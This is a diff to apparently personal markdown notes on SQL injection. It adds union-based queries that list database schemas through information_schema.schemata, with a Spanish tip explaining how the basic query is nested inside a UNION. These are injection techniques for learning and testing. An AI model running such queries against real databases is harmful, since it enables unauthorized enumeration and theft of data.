@@ -83,7 +83,7 @@ SELECT concat('Database PWNed : ',(schema_name)) FROM information_schema.schemat
 
 ### Union + Group Concat
 
-#### Union Select Progression:
+#### `Union Select` Progression:
 
 ````sql
 ## Original example v1:
@@ -104,7 +104,18 @@ select username,password from users where username = 'F0n3' union select 'izquie
 
 ---
 
-#### Union Select Progression:
+#### `Union Select` + `schema_name`
 
 ````sql
+##     Tip: básicamente se inserta el basic query (SELECT schema_name FROM information_schema.schemata;) dentro de un UNION pero se le quita el SELECT para que no se duplique ;)
+
+## Basic Union Select (v1)
+SELECT username,password FROM users UNION SELECT 1,schema_name FROM information_schema.schemata;
+
+## Condition Union Select (v2):
+select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata;
 ````
+
+---
+
+#### `Group Concat` + `Union Select` + `schema_name`
